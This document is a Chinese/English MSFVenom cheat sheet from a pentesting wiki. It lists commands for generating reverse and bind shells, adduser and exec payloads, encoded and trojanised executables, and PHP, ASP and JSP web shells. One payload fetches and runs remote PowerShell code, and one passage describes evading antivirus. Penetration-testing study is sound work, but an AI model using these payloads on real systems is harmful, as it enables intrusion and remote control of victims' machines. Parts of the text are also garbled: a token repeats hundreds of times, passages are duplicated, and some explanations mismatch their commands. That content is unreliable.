# MSFVenom - 速查表

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 NFT 收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof 是所有加密漏洞赏金的家园。**

**无需延迟获得奖励**\
HackenProof 的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。

**在 web3 渗透测试中获得经验**\
区块链协议和智能合约是新的互联网！在它崛起的日子里掌握 web3 安全。

**成为 web3 黑客传奇**\
每次验证的漏洞都会获得声望积分，并占领每周排行榜的榜首。

[**在 HackenProof 上注册**](https://hackenproof.com/register) 开始从你的黑客攻击中获利！

{% embed url="https://hackenproof.com/register" %}

***

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

也可以使用 `-a` 来指定架构或 `--platform`

## 列表
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## 创建 shellcode 时常见的参数

When creating a shellcode, there are several common parameters that can be used:

在创建 shellcode 时，可以使用以下几个常见参数：

- **`-p`** or **`--payload`**: Specifies the payload to use. This can be a built-in payload or a custom one.

- **`-p`** 或 **`--payload`**：指定要使用的 payload。这可以是内置的 payload 或自定义的 payload。

- **`-f`** or **`--format`**: Specifies the output format of the shellcode. This can be `raw`, `c`, `ruby`, `python`, `bash`, `exe`, `elf`, `dll`, `msi`, `psh`, `asp`, `jsp`, `war`, `pl`, `py`, `rb`, `sh`, `vba`, `vbs`, `hta`, `ps1`, `psm1`, `psd1`, `wsf`, `wsh`, `hta-psh`, `macro`, `mof`, `sct`, `scf`, `url`, `txt`, `xml`, `xsl`, `xaml`, `xslx`, `xls`, `doc`, `docm`, `docx`, `dot`, `dotm`, `dotx`, `rtf`, `odt`, `ods`, `odp`, `odb`, `odg`, `odf`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb`, `odb
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
To create a reverse shell payload for Windows, you can use the `msfvenom` tool from the Metasploit Framework. The `msfvenom` tool allows you to generate various types of payloads, including reverse shells.

Here is an example command to generate a reverse shell payload for Windows:

```plaintext
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe > shell.exe
```

In this command, replace `<attacker_ip>` with the IP address of your machine and `<attacker_port>` with the port number you want to use for the reverse shell connection.

The `-p` option specifies the payload to use, in this case, `windows/shell_reverse_tcp` which creates a reverse shell that connects back to the attacker's machine.

The `-f` option specifies the output format, in this case, `exe` which generates an executable file.

The `>` operator redirects the output to a file named `shell.exe`.

Once you have generated the payload, you can transfer it to the target Windows machine and execute it to establish a reverse shell connection.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### 绑定 Shell

绑定 Shell 是一种常见的远程访问技术，它允许攻击者在目标系统上建立一个监听端口，以便通过网络连接进行远程访问。攻击者可以使用 Metasploit 的 `msfvenom` 工具生成绑定 Shell 的有效载荷。

以下是使用 `msfvenom` 生成绑定 Shell 的示例命令：

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

在命令中，你需要替换以下参数：

- `<payload>`：选择适合你的目标系统的有效载荷。
- `<attacker IP>`：攻击者的 IP 地址，用于建立与目标系统的连接。
- `<attacker port>`：攻击者监听的端口号。
- `<format>`：生成有效载荷的格式，如 `exe`、`elf` 或 `raw`。
- `<output file>`：生成的有效载荷文件的输出路径和文件名。

生成的有效载荷文件可以在目标系统上执行，从而建立与攻击者的远程连接。这样，攻击者就可以通过该连接执行各种操作，包括获取敏感信息、执行命令等。

请注意，使用绑定 Shell 技术进行远程访问是非法的，除非你有合法的授权和目的。
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
To create a user, you can use the `msfvenom` tool in Metasploit. The `msfvenom` tool allows you to generate various types of payloads, including shellcode, which can be used to create a user on a target system.

Here is an example command to create a user using `msfvenom`:

```plaintext
msfvenom -p windows/adduser USER=username PASS=password -f exe > adduser.exe
```

This command will generate an executable file called `adduser.exe`, which, when executed on a Windows system, will create a new user with the specified username and password.

You can customize the payload according to your needs, such as specifying the target architecture, payload format, and other options. Refer to the `msfvenom` documentation for more information on available options and payload types.

Remember to use this technique responsibly and only on systems that you have proper authorization to access.
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell

CMD Shell（命令提示符）是一种常用的Windows命令行解释器。它允许用户通过输入命令来与操作系统进行交互。在渗透测试中，我们可以使用CMD Shell来执行各种命令和操作，以获取对目标系统的控制。

#### 生成CMD Shell Payload

使用`msfvenom`工具可以生成包含CMD Shell的恶意载荷。以下是生成CMD Shell Payload的示例命令：

```plaintext
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe > shell.exe
```

在上述命令中，我们使用`windows/shell_reverse_tcp`模块生成一个反向TCP连接的CMD Shell Payload。`LHOST`参数指定攻击者的IP地址，`LPORT`参数指定攻击者监听的端口号。生成的Payload将保存为`shell.exe`文件。

#### 运行CMD Shell Payload

一旦我们成功生成了CMD Shell Payload，我们可以将其传递给目标系统并执行。以下是一些常见的传递和执行CMD Shell Payload的方法：

- 通过社会工程学手段诱使目标用户点击恶意链接或下载恶意文件。
- 利用漏洞或弱密码获取目标系统的访问权限，并上传并执行Payload。
- 使用远程执行命令（RCE）漏洞执行Payload。

无论使用哪种方法，一旦成功执行了CMD Shell Payload，我们就可以在目标系统上执行各种命令和操作，包括浏览文件系统、执行系统命令、上传/下载文件等。

#### 绕过防御措施

为了成功使用CMD Shell进行渗透测试，我们可能需要绕过一些防御措施。以下是一些常见的绕过技术：

- 使用反射型DLL注入技术，将Payload注入到合法进程中，以避免被杀毒软件检测。
- 使用加密和编码技术对Payload进行混淆，以绕过入侵检测系统（IDS）和入侵防御系统（IPS）。
- 利用系统漏洞或弱密码，获取系统管理员权限，以绕过权限限制。

综上所述，CMD Shell是一种强大的工具，可用于渗透测试和攻击。通过生成恶意Payload并成功执行，我们可以获取对目标系统的控制，并执行各种操作。然而，我们应该始终遵守法律和道德规范，在合法授权的情况下使用这些技术。
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **执行命令**

To execute a command using `msfvenom`, you can use the following syntax:

使用`msfvenom`执行命令，可以使用以下语法：

```plaintext
msfvenom -p <payload> CMD=<command> [...]
```

Where `<payload>` is the desired payload to use and `<command>` is the command you want to execute.

其中，`<payload>`是要使用的有效载荷，`<command>`是要执行的命令。

For example, to execute the `whoami` command, you can use the following command:

例如，要执行`whoami`命令，可以使用以下命令：

```plaintext
msfvenom -p windows/exec CMD="whoami" -f <format> [...]
```

Replace `<format>` with the desired output format for the payload.

将`<format>`替换为有效载荷的所需输出格式。

After generating the payload, you can use it in various ways, such as embedding it in a malicious document or delivering it through a social engineering attack.

生成有效载荷后，可以通过多种方式使用，例如将其嵌入恶意文档中或通过社会工程攻击进行传递。
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### 编码器

An encoder is a tool used in hacking to obfuscate or encode malicious payloads. It is commonly used to bypass security measures such as antivirus software or intrusion detection systems (IDS). By encoding the payload, the hacker can make it more difficult for security tools to detect and analyze the malicious code.

There are various encoding techniques that can be used, such as XOR, base64, or hexadecimal encoding. These techniques convert the payload into a different format that can be decoded by the target system. The encoded payload can then be delivered to the target and decoded to execute the malicious actions.

Using an encoder can be an effective way to evade detection and increase the success rate of a hacking attack. However, it is important to note that encoding alone may not be sufficient to bypass advanced security measures. Additional techniques, such as encryption or obfuscation, may also be required to fully evade detection.

In summary, an encoder is a valuable tool in a hacker's arsenal for obfuscating and encoding malicious payloads to bypass security measures. It is important for hackers to stay updated on the latest encoding techniques and understand how to effectively use them in their attacks.
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### 嵌入可执行文件中

To embed a payload inside an executable file, you can use the `msfvenom` tool from the Metasploit Framework. This tool allows you to generate a custom payload and inject it into an existing executable file.

To embed the payload, you need to specify the `--payload` option followed by the desired payload type. For example, you can use `windows/meterpreter/reverse_tcp` for a Windows target or `linux/x86/meterpreter/reverse_tcp` for a Linux target.

Next, you need to specify the `--format` option to indicate the desired output format. You can choose formats such as `exe`, `elf`, or `dll`, depending on the target platform.

Finally, you need to specify the `--out` option followed by the output file name. This will create a new executable file with the embedded payload.

Here is an example command to embed a payload inside an executable file:

```
msfvenom --payload windows/meterpreter/reverse_tcp --format exe --out payload.exe
```

Remember to replace `windows/meterpreter/reverse_tcp` with the appropriate payload for your target.

Once the payload is embedded, you can deliver the modified executable file to the target system. When the file is executed, the payload will be executed as well, providing you with a remote shell or other desired functionality.

Keep in mind that embedding a payload inside an executable file may trigger antivirus or security software. To avoid detection, you can use techniques such as obfuscation or encryption to make the payload more difficult to detect.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
### 反向 Shell

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine. In the context of Linux payloads, a reverse shell payload is designed to establish a reverse shell connection from the target Linux machine to the attacker's machine.

To create a reverse shell payload using `msfvenom`, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

- `<payload>`: The payload to use. This can be any compatible payload, such as `linux/x86/shell_reverse_tcp`.
- `<attacker IP>`: The IP address of the attacker's machine.
- `<attacker port>`: The port on the attacker's machine to listen for the reverse shell connection.
- `<format>`: The output format for the payload. This can be any supported format, such as `elf`, `raw`, or `exe`.
- `<output file>`: The file to save the generated payload.

For example, to create a reverse shell payload using the `linux/x86/shell_reverse_tcp` payload, with the attacker's IP address set to `192.168.0.100` and the attacker's port set to `4444`, you can use the following command:

```plaintext
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f elf -o reverse_shell.elf
```

This will generate a Linux ELF binary file named `reverse_shell.elf`, which can be executed on the target machine to establish a reverse shell connection to the attacker's machine.
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### 绑定 Shell

绑定 Shell 是一种常见的远程访问技术，它允许攻击者在目标系统上建立一个监听端口，以便通过网络连接进行远程访问。攻击者可以使用 Metasploit 的 `msfvenom` 工具生成绑定 Shell 的有效载荷。

以下是使用 `msfvenom` 生成绑定 Shell 的示例命令：

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

在命令中，你需要替换以下参数：

- `<payload>`：选择适合你的目标系统的有效载荷。
- `<attacker IP>`：攻击者的 IP 地址，用于建立与目标系统的连接。
- `<attacker port>`：攻击者监听的端口号。
- `<format>`：生成有效载荷的格式，如 `exe`、`elf`、`dll` 等。
- `<output file>`：生成的有效载荷文件的输出路径和文件名。

生成的有效载荷文件可以在目标系统上执行，以建立与攻击者的连接。这样，攻击者就可以通过该连接执行各种操作，包括远程执行命令、上传/下载文件等。
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS（Solaris）

SunOS is a Unix-based operating system developed by Sun Microsystems, which is now owned by Oracle Corporation. Solaris is the commercial version of SunOS and is widely used in enterprise environments.

SunOS（Solaris）是由Sun Microsystems开发的基于Unix的操作系统，现在由Oracle Corporation拥有。Solaris是SunOS的商业版本，在企业环境中被广泛使用。
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC 载荷**

### **反向 Shell：**

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > shell.macho
```

This command generates a Mach-O binary payload for macOS that establishes a reverse shell connection to the specified IP address and port. The payload is saved as a file named `shell.macho`.

该命令生成一个用于 macOS 的 Mach-O 二进制载荷，用于与指定的 IP 地址和端口建立反向 shell 连接。载荷将保存为名为 `shell.macho` 的文件。

### **Bind Shell:**

```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f macho > shell.macho
```

This command generates a Mach-O binary payload for macOS that listens for incoming connections on the specified IP address and port. When a connection is established, a shell is spawned. The payload is saved as a file named `shell.macho`.

该命令生成一个用于 macOS 的 Mach-O 二进制载荷，用于在指定的 IP 地址和端口上监听传入连接。当建立连接时，将生成一个 shell。载荷将保存为名为 `shell.macho` 的文件。
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
A bind shell is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the bind shell provides a command-line interface to interact with the target system. This technique is commonly used in remote administration and hacking scenarios.

To create a bind shell payload using `msfvenom`, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<local IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use, such as `windows/meterpreter/reverse_tcp` or `linux/x86/shell/bind_tcp`.
- `<local IP>`: The IP address of your machine where the bind shell will listen for incoming connections.
- `<port>`: The port number on which the bind shell will listen.
- `<format>`: The desired output format, such as `exe`, `elf`, or `raw`.
- `<output file>`: The name of the output file where the bind shell payload will be saved.

For example, to create a bind shell payload for a Windows system that listens on port 4444 and saves it as `shell.exe`, you can use the following command:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f exe -o shell.exe
```

Remember to replace `<local IP>` with your actual IP address and `<port>` with the desired port number.

Once the bind shell payload is created, you can transfer it to the target system and execute it to establish a connection.
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **基于Web的Payloads**

### **PHP**

#### 反向shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
#### 反向 shell

The `msfvenom` tool can be used to generate a reverse shell payload in ASP/x format. This payload can be used to establish a reverse connection from the target machine to the attacker's machine.

To generate the reverse shell payload, use the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f asp > shell.asp
```

Replace `<attacker IP>` with the IP address of the attacker's machine and `<attacker port>` with the desired port number.

Once the payload is generated, it can be uploaded to the target machine and executed. This will establish a reverse connection, allowing the attacker to interact with the target machine's shell.

Note: Make sure to set up a listener on the specified port to catch the incoming connection.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### 反向 shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f war > shell.war
```

使用 `msfvenom` 工具生成一个包含反向 shell 功能的 JSP 文件。

- `-p java/jsp_shell_reverse_tcp`：指定使用 Java JSP 反向 shell 功能。
- `LHOST=<attacker IP>`：将 `<attacker IP>` 替换为攻击者的 IP 地址。
- `LPORT=<attacker port>`：将 `<attacker port>` 替换为攻击者监听的端口号。
- `-f war`：将生成的 JSP 文件保存为 WAR 文件格式。
- `> shell.war`：将生成的 WAR 文件保存为 `shell.war`。

然后，将生成的 `shell.war` 文件部署到目标服务器上，以触发反向 shell 连接。
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
